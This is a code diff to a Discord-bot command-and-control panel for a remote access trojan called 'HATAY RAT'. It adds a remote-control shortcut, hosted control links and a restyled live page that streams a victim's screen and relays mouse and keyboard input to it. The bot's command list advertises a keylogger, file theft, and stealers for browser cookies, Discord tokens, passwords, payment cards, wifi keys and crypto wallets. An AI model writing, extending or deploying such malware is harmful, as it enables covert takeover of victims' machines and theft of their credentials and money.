@@ -99,7 +99,7 @@ bot.remove_command("help")
 
 def get_help_embed():
     embed = discord.Embed(title="🔴 HATAY RAT - Command Center", color=0xFF0000)
-    embed.add_field(name="📊 INFO", value="`!info` `!screenshot` `!camshot` `!targets` `!use <id>`", inline=False)
+    embed.add_field(name="📊 INFO", value="`!info` `!screenshot` `!camshot` `!targets` `!use <id>` `!remot`", inline=False)
     embed.add_field(name="📁 FILES", value="`!ls <path>` `!download <path>` `!upload <url> <name>` `!remove <path>`", inline=False)
     embed.add_field(name="⌨️ KEYLOGGER", value="`!keylog start` `!keylog stop` `!keylog dump`", inline=False)
     embed.add_field(name="💀 STEALER", value="`!cookie` `!token` `!pass` `!card` `!grab_plus` `!wifi` `!wallet_pro`", inline=False)
@@ -173,7 +173,7 @@ async def token(ctx):
     queue_command(current_target_id, "token")
     await ctx.send(f"💎 Ultra Deep Token Search & Verification (Nitro/Billing) requested for `{current_target_id}`...")
 
-@bot.command()
+@bot.command(name="remote")
 async def remote(ctx, action: str = "start"):
     if not current_target_id:
         return await ctx.send("❌ No target selected. Use `!use <id>` first.")
@@ -181,10 +181,14 @@ async def remote(ctx, action: str = "start"):
     if action == "start":
         queue_command(current_target_id, "remote_start")
         await ctx.send(f"🖥️ Remote Control starting for `{current_target_id}`...")
-        await ctx.send(f"🔗 **Control Link:** {os.getenv('SERVER_URL', 'http://localhost:8000')}/remote/{current_target_id}")
+        await ctx.send(f"🔗 **Control Link:** {os.getenv('SERVER_URL', 'https://' + os.getenv('RENDER_EXTERNAL_HOSTNAME')) if os.getenv('RENDER_EXTERNAL_HOSTNAME') else 'http://localhost:8000'}/remote/{current_target_id}")
     else:
         queue_command(current_target_id, "remote_stop")
         await ctx.send(f"🛑 Remote Control stopping for `{current_target_id}`.")
+
+@bot.command(name="remot")
+async def remot_shortcut(ctx):
+    await remote(ctx, "start")
 
 @bot.command()
 async def password(ctx, browser: str = "all"):
@@ -538,33 +542,167 @@ async def remote_page(client_id: str):
     
     html_content = f"""
     <!DOCTYPE html>
-    <html>
+    <html lang="en">
     <head>
-        <title>Remote Control - {client_id}</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Fluxus Remote - {client_id}</title>
+        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
         <style>
-            body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; text-align: center; margin: 0; overflow: hidden; }}
-            #screen {{ max-width: 90vw; max-height: 85vh; border: 2px solid #0f0; cursor: crosshair; margin-top: 10px; }}
-            .status {{ padding: 10px; background: #111; border-bottom: 1px solid #0f0; }}
-            .controls {{ padding: 5px; font-size: 0.8em; color: #aaa; }}
+            :root {{
+                --bg: #050505;
+                --panel: rgba(20, 20, 20, 0.7);
+                --accent: #00f2ff;
+                --text: #e0e0e0;
+                --glass: rgba(255, 255, 255, 0.03);
+            }}
+            
+            body {{ 
+                background: var(--bg); 
+                color: var(--text); 
+                font-family: 'Outfit', sans-serif; 
+                margin: 0; 
+                overflow: hidden;
+                display: flex;
+                flex-direction: column;
+                height: 100vh;
+                background-image: 
+                    radial-gradient(circle at 20% 20%, rgba(0, 242, 255, 0.05) 0%, transparent 40%),
+                    radial-gradient(circle at 80% 80%, rgba(255, 0, 153, 0.05) 0%, transparent 40%);
+            }}
+            
+            .header {{
+                padding: 20px;
+                background: var(--panel);
+                backdrop-filter: blur(20px);
+                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                z-index: 100;
+            }}
+
+            .title {{
+                font-weight: 600;
+                letter-spacing: 2px;
+                background: linear-gradient(90deg, #00f2ff, #ff0099);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                text-transform: uppercase;
+                font-size: 1.2em;
+            }}
+
+            .badge {{
+                background: rgba(0, 242, 255, 0.1);
+                color: #00f2ff;
+                padding: 4px 12px;
+                border-radius: 20px;
+                font-size: 0.8em;
+                border: 1px solid rgba(0, 242, 255, 0.3);
+                font-family: 'JetBrains Mono', monospace;
+            }}
+
+            .main-container {{
+                flex: 1;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+                position: relative;
+            }}
+
+            #screen-wrapper {{
+                position: relative;
+                box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+                border-radius: 12px;
+                overflow: hidden;
+                border: 1px solid rgba(255,255,255,0.1);
+                background: #000;
+                transition: transform 0.3s ease;
+            }}
+
+            #screen {{ 
+                display: block;
+                max-width: 85vw; 
+                max-height: 75vh; 
+                cursor: crosshair;
+            }}
+
+            .overlay {{
+                position: absolute;
+                top: 0; left: 0; right: 0; bottom: 0;
+                pointer-events: none;
+                box-shadow: inset 0 0 100px rgba(0,0,0,0.5);
+            }}
+
+            .controls-info {{
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: var(--panel);
+                backdrop-filter: blur(10px);
+                padding: 10px 25px;
+                border-radius: 30px;
+                font-size: 0.85em;
+                color: #888;
+                border: 1px solid rgba(255,255,255,0.05);
+                display: flex;
+                gap: 20px;
+                z-index: 100;
+            }}
+
+            .key-hint b {{ color: var(--accent); }}
+
+            .status-dot {{
+                width: 8px;
+                height: 8px;
+                background: #00f2ff;
+                border-radius: 50%;
+                display: inline-block;
+                margin-right: 8px;
+                box-shadow: 0 0 10px #00f2ff;
+                animation: pulse 2s infinite;
+            }}
+
+            @keyframes pulse {{
+                0% {{ opacity: 0.4; }}
+                50% {{ opacity: 1; }}
+                100% {{ opacity: 0.4; }}
+            }}
         </style>
     </head>
     <body onkeydown="sendKey(event)">
-        <div class="status">
-            🔴 LIVE REMOTE CONTROL: {sessions[client_id].username}@{sessions[client_id].hostname} ({client_id})
+        <div class="header">
+            <div class="title">Fluxus Live Control</div>
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <span class="badge">{sessions[client_id].username}@{sessions[client_id].hostname}</span>
+                <span style="font-size: 0.9em; color: #555;">ID: {client_id}</span>
+            </div>
         </div>
-        <img id="screen" src="/api/remote/frame/{client_id}" onclick="sendClick(event)" onmousemove="sendMove(event)">
-        <div class="controls">
-            [Click to Mouse Click] | [Keyboard to Type] | [Move Mouse to Hover]
+
+        <div class="main-container">
+            <div id="screen-wrapper">
+                <img id="screen" src="/api/remote/frame/{client_id}" onclick="sendClick(event)" onmousemove="sendMove(event)">
+                <div class="overlay"></div>
+            </div>
+        </div>
+
+        <div class="controls-info">
+            <span class="key-hint"><span class="status-dot"></span>LIVE MONITORING</span>
+            <span class="key-hint"><b>CLICK</b> TO CONTROL</span>
+            <span class="key-hint"><b>KEYS</b> TO TYPE</span>
         </div>
 
         <script>
             const clientId = "{client_id}";
             const screen = document.getElementById('screen');
+            let lastMove = 0;
             
             // Refresh screen
             setInterval(() => {{
                 screen.src = "/api/remote/frame/" + clientId + "?t=" + new Date().getTime();
-            }}, 500);
+            }}, 200);
 
             function sendEvent(event) {{
                 fetch("/api/remote/control", {{
@@ -581,10 +719,9 @@ async def remote_page(client_id: str):
                 sendEvent({{ type: "click", button: "left" }});
             }}
 
-            let lastMove = 0;
             function sendMove(e) {{
                 const now = Date.now();
-                if (now - lastMove < 200) return; // Throttling
+                if (now - lastMove < 100) return; // Throttling for smoother experience
                 lastMove = now;
 
                 const rect = screen.getBoundingClientRect();
@@ -594,11 +731,16 @@ async def remote_page(client_id: str):
             }}
 
             function sendKey(e) {{
-                // Prevent scrolling/standard actions
-                if(["ArrowUp","ArrowDown","ArrowLeft","ArrowRight","Space"].includes(e.code)) {{
+                if(["ArrowUp","ArrowDown","ArrowLeft","ArrowRight","Space", "Tab", "Alt", "Control", "Shift"].includes(e.code)) {{
                     e.preventDefault();
                 }}
-                sendEvent({{ type: "type", key: e.key.toLowerCase() }});
+                
+                let key = e.key;
+                if (key.length === 1) key = key.toLowerCase();
+                else if (key === " ") key = "space";
+                else key = key.toLowerCase();
+
+                sendEvent({{ type: "type", key: key }});
             }}
         </script>
     </body>
